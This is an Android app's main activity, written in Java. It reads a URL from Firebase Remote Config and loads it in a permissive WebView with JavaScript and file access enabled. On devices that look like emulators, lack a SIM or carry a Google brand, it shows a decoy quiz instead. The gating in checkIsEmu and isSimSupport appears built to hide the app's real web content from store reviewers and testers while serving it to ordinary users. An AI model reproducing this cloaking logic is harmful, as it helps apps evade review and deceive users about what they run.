package com.test;

import static android.content.ContentValues.TAG;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.PersistableBundle;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.renderscript.ScriptGroup;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.KeyEvent;
import android.webkit.CookieManager;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

import java.io.IOException;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    private WebView webView;

    private final String TAG = MainActivity.class.getName();

    private FirebaseRemoteConfig mFirebaseRemoteConfig;

    private Boolean isLoad;

    String orig = "";

    @Override
    protected void onSaveInstanceState(@NonNull Bundle outState) {
        webView.saveState(outState);
        super.onSaveInstanceState(outState);
    }

    @Override
    protected void onRestoreInstanceState(@NonNull Bundle savedInstanceState) {
        webView.restoreState(savedInstanceState);
        super.onRestoreInstanceState(savedInstanceState);
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (event.getAction() == KeyEvent.ACTION_DOWN) {
            switch (keyCode) {
                case KeyEvent.KEYCODE_BACK:
                    if (webView.canGoBack()) {
                        webView.goBack();
                    } else {

                    }
                    return true;
            }

        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        String link = preferences.getString("link", "");
        webView = (WebView) findViewById(R.id.webView);
        webView.setWebViewClient(new WebViewClient());
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);

        if (!link.equals("")) {
            webView.loadUrl(link);
            webView.setWebViewClient(new WebViewClient() {
                @Override
                public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                    webView.loadData(
                            "<br><div>Please check your internet connection.</div>",
                            "text/html", "UTF-8");
                    super.onReceivedError(view, errorCode, description, failingUrl);
                }
            });
        } else {
            mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
            FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                    .setMinimumFetchIntervalInSeconds(60)
                    .build();
            mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
            getValueFromFireBaseConfig();
            new CountDownTimer(1500, 100) {
                public void onTick(long millisUntilFinished) {
                }

                public void onFinish() {
                    if (isLoad) {
                        orig = mFirebaseRemoteConfig.getString("api_url");
                        if (checkIsEmu() || !isSimSupport(MainActivity.this) || orig.equals("")) {
                            Intent intent = Quiz.newIntent(MainActivity.this);
                            startActivity(intent);
                            finish();
                        } else {
                            preferences.edit().putString("link", orig).apply();
                            if (savedInstanceState != null) {
                                webView.restoreState(savedInstanceState);
                            } else {
                                webView.loadUrl(orig);
                            }
                            webSettings.setDomStorageEnabled(true);
                            webSettings.setJavaScriptCanOpenWindowsAutomatically(true);
                            CookieManager cookieManager = CookieManager.getInstance();
                            cookieManager.setAcceptCookie(true);
                            webSettings.setLoadWithOverviewMode(true);
                            webSettings.setUseWideViewPort(true);
                            webSettings.setDatabaseEnabled(true);
                            webSettings.setSupportZoom(false);
                            webSettings.setAllowFileAccess(true);
                            webSettings.setAllowContentAccess(true);
                            webSettings.setRenderPriority(WebSettings.RenderPriority.HIGH);
                        }
                    }
                }
            }.start();
        }
    }

    private void getValueFromFireBaseConfig() {
        mFirebaseRemoteConfig.fetchAndActivate()
                .addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                    @Override
                    public void onComplete(@NonNull Task<Boolean> task) {
                        if (task.isSuccessful()) {
                            isLoad = true;
                        } else {
                            isLoad = false;
                            webView.loadUrl("www.google.com");  //для вызова ошибки "Нет подключения к интернету"
                            webView.setWebViewClient(new WebViewClient() {
                                @Override
                                public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                                    webView.loadData(
                                            "<br><div>Please check your internet connection.</div>",
                                            "text/html", "UTF-8");
                                    super.onReceivedError(view, errorCode, description, failingUrl);
                                }
                            });

                        }
                    }
                });
    }

    private Boolean checkIsEmu() {
        if (BuildConfig.DEBUG) return false;
        String phoneModel = Build.MODEL;
        String buildProduct = Build.PRODUCT;
        String buildHardware = Build.HARDWARE;
        String brand = Build.BRAND;
        boolean result = (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.toLowerCase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware.equals("goldfish")
                || Build.BRAND.contains("google")
                || buildHardware.equals("vbox86")
                || buildProduct.equals("sdk")
                || buildProduct.equals("google_sdk")
                || buildProduct.equals("sdk_x86")
                || buildProduct.equals("vbox86p")
                || Build.BOARD.toLowerCase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.toLowerCase(Locale.getDefault()).contains("nox")
                || buildHardware.toLowerCase(Locale.getDefault()).contains("nox")
                || buildProduct.toLowerCase(Locale.getDefault()).contains("nox"));
        if (result) return true;
        result = result || (Build.BRAND.startsWith("generic") &&
                Build.DEVICE.startsWith("generic"));
        if (result) return true;
        result = result || (buildProduct.equals("google_sdk"));
        return result;
    }

    private boolean isSimSupport(Context context) {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        return !(tm.getSimState() == TelephonyManager.SIM_STATE_ABSENT);
    }
}
